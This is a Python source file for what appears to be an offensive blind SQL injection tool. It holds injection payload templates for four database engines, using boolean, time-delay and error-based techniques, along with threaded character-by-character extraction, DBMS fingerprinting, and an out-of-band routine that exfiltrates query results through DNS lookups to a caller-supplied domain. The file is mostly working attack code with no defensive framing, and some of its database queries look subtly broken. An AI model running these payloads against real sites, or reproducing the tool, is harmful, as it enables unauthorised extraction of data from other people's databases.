import re, time, json, string, concurrent.futures, math
from typing import Optional, Dict, List, Tuple, Callable
from enum import Enum

from tools.log_utils import get_logger
from tools.http_client import build_url

logger = get_logger("sqli_blind")


class BlindTech(Enum):
    BOOLEAN = "boolean"
    TIME = "time"
    ERROR = "error"
    OOB_DNS = "oob_dns"


# ---------------------------------------------------------------------------
# DBMS-specific payload templates
# ---------------------------------------------------------------------------

# Boolean-based: (true_payload, false_payload, true_marker, false_marker)
BOOL_TEMPLATES = {
    "mysql": (
        "' AND (SELECT SUBSTRING(%s,%d,1)='%s')-- ",
        "' AND (SELECT SUBSTRING(%s,%d,1)>'%s')-- ",
    ),
    "mssql": (
        "' AND (SELECT SUBSTRING(%s,%d,1)='%s')-- ",
        "' AND (SELECT SUBSTRING(%s,%d,1)>'%s')-- ",
    ),
    "postgresql": (
        "' AND (SELECT SUBSTRING(%s FROM %d FOR 1)='%s')-- ",
        "' AND (SELECT SUBSTRING(%s FROM %d FOR 1)>'%s')-- ",
    ),
    "oracle": (
        "' AND (SELECT SUBSTR(%s,%d,1) FROM DUAL)='%s'-- ",
        "' AND (SELECT SUBSTR(%s,%d,1) FROM DUAL)>'%s'-- ",
    ),
}

SLEEP_FN = {
    "mysql": "SLEEP(%d)",
    "mssql": "WAITFOR DELAY '0:0:%d'",
    "postgresql": "pg_sleep(%d)",
    "oracle": "DBMS_PIPE.RECEIVE_MESSAGE('x',%d)",
}

TIME_TEMPLATES = {
    "mysql": (
        "' OR IF((SELECT SUBSTRING(%s,%d,1)='%s'),SLEEP(%d),0)-- ",
        "' OR IF((SELECT SUBSTRING(%s,%d,1)>'%s'),SLEEP(%d),0)-- ",
    ),
    "mssql": (
        "'; IF((SELECT SUBSTRING(%s,%d,1)='%s')) WAITFOR DELAY '0:0:%d'-- ",
        "'; IF((SELECT SUBSTRING(%s,%d,1)>'%s')) WAITFOR DELAY '0:0:%d'-- ",
    ),
    "postgresql": (
        "'; SELECT CASE WHEN (SELECT SUBSTRING(%s FROM %d FOR 1)='%s') THEN pg_sleep(%d) ELSE 0 END-- ",
        "'; SELECT CASE WHEN (SELECT SUBSTRING(%s FROM %d FOR 1)>'%s') THEN pg_sleep(%d) ELSE 0 END-- ",
    ),
    "oracle": (
        "' OR (SELECT CASE WHEN (SELECT SUBSTR(%s,%d,1) FROM DUAL)='%s' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',%d) ELSE NULL END FROM DUAL)-- ",
        "' OR (SELECT CASE WHEN (SELECT SUBSTR(%s,%d,1) FROM DUAL)>'%s' THEN DBMS_PIPE.RECEIVE_MESSAGE('x',%d) ELSE NULL END FROM DUAL)-- ",
    ),
}

ERROR_EXTRACT_TEMPLATES = {
    "mysql": "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT %s)))-- ",
    "mssql": "' AND 1=CONVERT(INT,(SELECT %s))-- ",
    "postgresql": "' AND 1=CAST((SELECT %s) AS INT)-- ",
    "oracle": "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT %s FROM DUAL))-- ",
}

ERROR_EXTRACT_REGEX = {
    "mysql": [r'~(.+?)[\'"]', r'~(.+?)(?:\s|$)', r'XPATH syntax error: \'(.+?)\''],
    "mssql": [r'Conversion failed.*\'(.+?)\'', r'Conversion failed when converting'],
    "postgresql": [r'ERROR:\s*(.+?)\.'],
}

OOB_DNS_PAYLOADS = {
    "mysql": "LOAD_FILE(CONCAT('\\\\\\\\',(%s),'.%s\\\\test'))",
    "mssql": "DECLARE @h VARCHAR(8000);SELECT @h=CONCAT((SELECT %s),'.%s');EXEC master.sys.xp_dirtree @h,0,0",
    "postgresql": "COPY (SELECT CONCAT((SELECT %s),'.%s')) TO PROGRAM 'nslookup'",
    "oracle": "SELECT UTL_INADDR.GET_HOST_ADDRESS(CONCAT((SELECT %s FROM DUAL),'.%s')) FROM DUAL",
}

QUERY_CHARSET = string.digits + string.ascii_lowercase + '.-_@/: '

DEFAULT_QUERIES = {
    "version": "VERSION()",
    "user": "USER()",
    "database": "DATABASE()",
}

MYSQL_QUERIES = {
    "version": "@@version",
    "user": "user()",
    "database": "database()",
}

MSSQL_QUERIES = {
    "version": "@@version",
    "user": "suser_name()",
    "database": "db_name()",
}


# ---------------------------------------------------------------------------
# Comparator: learns what true/false look like
# ---------------------------------------------------------------------------

class ResponseClassifier:
    def __init__(self, sess: "requests.Session", timeout: float):
        self.sess = sess
        self.timeout = timeout
        self.baseline_len = 0
        self.baseline_text = ""
        self.baseline_time = 0.0
        self.true_len = 0
        self.true_text = ""
        self.false_len = 0
        self.false_text = ""
        self.calibrated = False
        self.threshold = 0.2
        self.min_time_diff = 0.0

    def calibrate(self, url: str, param: str, true_payload: str,
                  false_payload: str) -> bool:
        try:
            start = time.time()
            r1 = self.sess.get(build_url(url, param, true_payload),
                               timeout=self.timeout, verify=False)
            self.true_len = len(r1.text)
            self.true_text = r1.text
            self.baseline_time = time.time() - start
        except Exception as e:
            logger.debug("calibrate true: %s", e)
            return False

        try:
            r2 = self.sess.get(build_url(url, param, false_payload),
                               timeout=self.timeout, verify=False)
            self.false_len = len(r2.text)
            self.false_text = r2.text
        except Exception as e:
            logger.debug("calibrate false: %s", e)
            return False

        self.calibrated = True
        return True

    def is_true(self, url: str, param: str, payload: str) -> Optional[bool]:
        if not self.calibrated:
            return None
        try:
            r = self.sess.get(build_url(url, param, payload),
                              timeout=self.timeout, verify=False)
            cur_len = len(r.text)
            cur_text = r.text

            len_diff_true = abs(cur_len - self.true_len)
            len_diff_false = abs(cur_len - self.false_len)

            if len_diff_true <= 5 and len_diff_false > 10:
                return True
            if len_diff_false <= 5 and len_diff_true > 10:
                return False

            if len_diff_true < len_diff_false:
                return True
            if len_diff_false < len_diff_true:
                return False

            common_true = sum(1 for a, b in zip(cur_text[:200], self.true_text[:200]) if a == b)
            common_false = sum(1 for a, b in zip(cur_text[:200], self.false_text[:200]) if a == b)
            if common_true > common_false * 1.2:
                return True
            if common_false > common_true * 1.2:
                return False

            return None
        except Exception:
            return None


# ---------------------------------------------------------------------------
# Blind SQLi Engine
# ---------------------------------------------------------------------------

class BlindInjector:
    def __init__(self, sess: Optional["requests.Session"] = None,
                 timeout: float = 10.0, sleep_time: int = 2,
                 max_workers: int = 8):
        import requests
        self.sess = sess or requests.Session()
        self.timeout = timeout
        self.sleep_time = sleep_time
        self.max_workers = max_workers
        self.dbms: Optional[str] = None
        self.tech: Optional[BlindTech] = None
        self.classifier = ResponseClassifier(self.sess, timeout)
        self.baseline_time = 0.0

    def _auto_detect_dbms(self, url: str, param: str) -> Optional[str]:
        for dbms in ["mysql", "mssql", "postgresql", "oracle"]:
            if dbms not in SLEEP_FN:
                continue
            sleep_payload = "' OR '1'='1"
            try:
                r = self.sess.get(build_url(url, param, sleep_payload),
                                  timeout=self.timeout, verify=False)
                body = r.text.lower()
                if re.search(r"mysql|maria|sql syntax", body):
                    return "mysql"
                if re.search(r"microsoft.*sql|sql.server|driver.*sql", body):
                    return "mssql"
                if re.search(r"postgresql|psql|pg_|postgres", body):
                    return "postgresql"
                if re.search(r"ora-\d{5}|oracle.*driver|ORA", body):
                    return "oracle"
            except Exception:
                pass

        for dbms in ["mysql", "mssql", "postgresql", "oracle"]:
            if dbms not in SLEEP_FN:
                continue
            fn = SLEEP_FN[dbms] % self.sleep_time
            payload = f"' OR {fn}-- "
            try:
                start = time.time()
                self.sess.get(build_url(url, param, payload),
                              timeout=self.timeout + 3, verify=False)
                elapsed = time.time() - start
                if elapsed >= self.sleep_time * 0.7:
                    return dbms
            except Exception:
                pass

        return None

    def _measure_baseline(self, url: str, param: str) -> float:
        times = []
        for _ in range(3):
            try:
                start = time.time()
                self.sess.get(build_url(url, param, "1"),
                              timeout=self.timeout, verify=False)
                times.append(time.time() - start)
            except Exception:
                pass
        if times:
            return sum(times) / len(times)
        return 0.3

    def _extract_char_bool(self, url: str, param: str, query: str,
                           pos: int, charset: str = QUERY_CHARSET) -> Optional[str]:
        if self.dbms not in BOOL_TEMPLATES:
            return None
        eq_tpl, gt_tpl = BOOL_TEMPLATES[self.dbms]

        lo, hi = 0, len(charset) - 1
        while lo <= hi:
            mid = (lo + hi) // 2
            test_char = charset[mid]
            try:
                gt_payload = gt_tpl % (query, pos, test_char)
                gt_result = self.classifier.is_true(url, param, gt_payload)
            except Exception:
                gt_result = None

            if gt_result is None:
                try:
                    eq_payload = eq_tpl % (query, pos, test_char)
                    eq_result = self.classifier.is_true(url, param, eq_payload)
                except Exception:
                    eq_result = None
                if eq_result is True:
                    return test_char
                return None

            if gt_result is True:
                lo = mid + 1
            else:
                try:
                    eq_payload = eq_tpl % (query, pos, test_char)
                    eq_result = self.classifier.is_true(url, param, eq_payload)
                except Exception:
                    eq_result = None
                if eq_result is True:
                    return test_char
                hi = mid - 1

        return None

    def _extract_char_time(self, url: str, param: str, query: str,
                           pos: int, charset: str = QUERY_CHARSET) -> Optional[str]:
        if self.dbms not in TIME_TEMPLATES:
            return None
        eq_tpl, gt_tpl = TIME_TEMPLATES[self.dbms]
        sleep_dur = self.sleep_time

        lo, hi = 0, len(charset) - 1
        while lo <= hi:
            mid = (lo + hi) // 2
            test_char = charset[mid]

            gt_payload = gt_tpl % (query, pos, test_char, sleep_dur)
            try:
                start = time.time()
                self.sess.get(build_url(url, param, gt_payload),
                              timeout=self.timeout + sleep_dur + 1, verify=False)
                elapsed = time.time() - start
            except Exception:
                elapsed = 0

            if elapsed >= sleep_dur * 0.7:
                lo = mid + 1
            else:
                eq_payload = eq_tpl % (query, pos, test_char, sleep_dur)
                try:
                    start = time.time()
                    self.sess.get(build_url(url, param, eq_payload),
                                  timeout=self.timeout + sleep_dur + 1, verify=False)
                    elapsed2 = time.time() - start
                except Exception:
                    elapsed2 = 0
                if elapsed2 >= sleep_dur * 0.7:
                    return test_char
                hi = mid - 1

        return None

    def _extract_string_bool(self, url: str, param: str, query: str,
                             max_len: int = 64) -> str:
        result = ""
        for pos in range(1, max_len + 1):
            ch = self._extract_char_bool(url, param, query, pos)
            if ch is None:
                break
            result += ch
        return result

    def _extract_string_time(self, url: str, param: str, query: str,
                             max_len: int = 32) -> str:
        result = ""
        for pos in range(1, max_len + 1):
            ch = self._extract_char_time(url, param, query, pos)
            if ch is None:
                break
            result += ch
        return result

    def _extract_string_parallel(self, url: str, param: str, query: str,
                                 max_len: int = 32) -> str:
        if self.tech == BlindTech.BOOLEAN:
            extract_fn = self._extract_char_bool
        elif self.tech == BlindTech.TIME:
            extract_fn = self._extract_char_time
        else:
            return ""

        results = [None] * max_len

        def _extract_at(pos: int) -> Tuple[int, Optional[str]]:
            ch = extract_fn(url, param, query, pos)
            return pos, ch

        with concurrent.futures.ThreadPoolExecutor(max_workers=self.max_workers) as ex:
            futures = {ex.submit(_extract_at, pos): pos for pos in range(1, max_len + 1)}
            for future in concurrent.futures.as_completed(futures):
                pos, ch = future.result()
                results[pos - 1] = ch

        return "".join(r for r in results if r is not None)

    def _extract_via_error(self, url: str, param: str, query: str) -> Optional[str]:
        if self.dbms not in ERROR_EXTRACT_TEMPLATES:
            return None
        tpl = ERROR_EXTRACT_TEMPLATES[self.dbms]
        payload = tpl % query
        try:
            r = self.sess.get(build_url(url, param, payload),
                              timeout=self.timeout, verify=False)
            patterns = ERROR_EXTRACT_REGEX.get(self.dbms, [])
            for pat in patterns:
                m = re.search(pat, r.text, re.IGNORECASE)
                if m:
                    return m.group(1)[:128]
        except Exception as e:
            logger.debug("error extract: %s", e)
        return None

    def _try_dbms_queries(self, url: str, param: str, dbms: str,
                           result: Dict) -> bool:
        self.dbms = dbms
        dbms_query_map = {
            "mysql": MYSQL_QUERIES,
            "mssql": MSSQL_QUERIES,
            "postgresql": {"version": "VERSION()", "user": "current_user",
                           "database": "current_database()"},
            "oracle": {"version": "VERSION()", "user": "USER",
                       "database": "ORA_DATABASE_NAME"},
        }
        queries = dbms_query_map.get(dbms, DEFAULT_QUERIES)
        result["dbms"] = dbms

        true_payload = "' AND 1=1-- "
        false_payload = "' AND 1=2-- "

        if self.classifier.calibrate(url, param, true_payload, false_payload):
            self.tech = BlindTech.BOOLEAN
            self.baseline_time = self._measure_baseline(url, param)
            result["technique"] = "boolean"

            for key, query in queries.items():
                if not query:
                    continue
                try:
                    val = self._extract_string_parallel(url, param, query, self.max_len)
                    if val:
                        result["data"][key] = val
                except Exception as e:
                    logger.debug("bool extract %s[%s]: %s", dbms, key, e)

            if result["data"]:
                result["vulnerable"] = True
                return True

        if not result["vulnerable"]:
            for key, query in queries.items():
                if not query:
                    continue
                try:
                    val = self._extract_via_error(url, param, query)
                    if val:
                        result["technique"] = "error"
                        result["data"][key] = val
                        result["vulnerable"] = True
                except Exception as e:
                    logger.debug("error extract %s[%s]: %s", dbms, key, e)

            if result["data"]:
                return True

        if not result["vulnerable"]:
            self.tech = BlindTech.TIME
            self.baseline_time = self._measure_baseline(url, param)
            result["technique"] = "time"

            for key, query in queries.items():
                if not query:
                    continue
                try:
                    ml = min(self.max_len, 16)
                    val = self._extract_string_parallel(url, param, query, ml)
                    if val:
                        result["data"][key] = val
                except Exception as e:
                    logger.debug("time extract %s[%s]: %s", dbms, key, e)

            if result["data"]:
                result["vulnerable"] = True
                return True

        return False

    def run(self, url: str, param: str,
            queries: Dict[str, str] = None,
            forced_dbms: str = None,
            max_len: int = 32,
            parallel: bool = True) -> Dict:
        self.max_len = max_len
        result = {
            "vulnerable": False,
            "dbms": None,
            "technique": None,
            "data": {},
            "error": None,
        }

        detected_dbms = forced_dbms or self._auto_detect_dbms(url, param)
        if detected_dbms:
            if self._try_dbms_queries(url, param, detected_dbms, result):
                return result

        for fallback in ["mysql", "mssql", "postgresql", "oracle"]:
            if fallback == detected_dbms:
                continue
            logger.debug("trying fallback DBMS: %s", fallback)
            if self._try_dbms_queries(url, param, fallback, result):
                return result

        if not result["data"]:
            result["error"] = "Could not detect DBMS or extract data with any template"
        return result


# ---------------------------------------------------------------------------
# OOB DNS Exfiltration
# ---------------------------------------------------------------------------

def check_oob_dns(url: str, param: str, oob_domain: str,
                  sess: Optional["requests.Session"] = None,
                  timeout: float = 10.0) -> Dict:
    import requests
    if sess is None:
        sess = requests.Session()
    result = {"vulnerable": False, "findings": []}

    detector = BlindInjector(sess, timeout)
    dbms = detector._auto_detect_dbms(url, param)
    if not dbms:
        return result
    result["dbms"] = dbms

    if dbms not in OOB_DNS_PAYLOADS:
        return result

    test_queries = [
        ("version", "VERSION()", "@@version"),
        ("user", "USER()", "user()"),
        ("database", "DATABASE()", "database()"),
    ]

    query_map = {
        "mysql": {"version": "@@version", "user": "user()", "database": "database()"},
        "mssql": {"version": "@@version", "user": "suser_name()", "database": "db_name()"},
        "postgresql": {"version": "VERSION()", "user": "current_user", "database": "current_database()"},
        "oracle": {"version": "SELECT banner FROM v$version", "user": "user FROM dual", "database": "ora_database_name FROM dual"},
    }

    queries = query_map.get(dbms, {})
    tpl = OOB_DNS_PAYLOADS[dbms]

    for key, q in queries.items():
        try:
            oob_payload = tpl % (q, oob_domain)
            sess.get(build_url(url, param, oob_payload), timeout=timeout, verify=False)
            result["findings"].append({
                "type": "oob_dns",
                "detail": f"OOB DNS payload sent for {key} via {dbms}",
                "query": q,
                "oob_domain": oob_domain,
            })
            result["vulnerable"] = True
        except Exception as e:
            logger.debug("oob dns %s: %s", key, e)

    return result


# ---------------------------------------------------------------------------
# Compatibility: simple check that discovers blind SQli
# ---------------------------------------------------------------------------

def check(url: str, param: str, sess: Optional["requests.Session"] = None,
          timeout: float = 10.0, post_body: bool = False,
          post_data: dict = None) -> Dict:
    if sess is None:
        import requests
        sess = requests.Session()

    injector = BlindInjector(sess, timeout)

    queries = {
        "version": MYSQL_QUERIES.get("version", "VERSION()"),
        "user": MYSQL_QUERIES.get("user", "USER()"),
        "database": MYSQL_QUERIES.get("database", "DATABASE()"),
    }

    result = injector.run(url, param, queries)

    return result
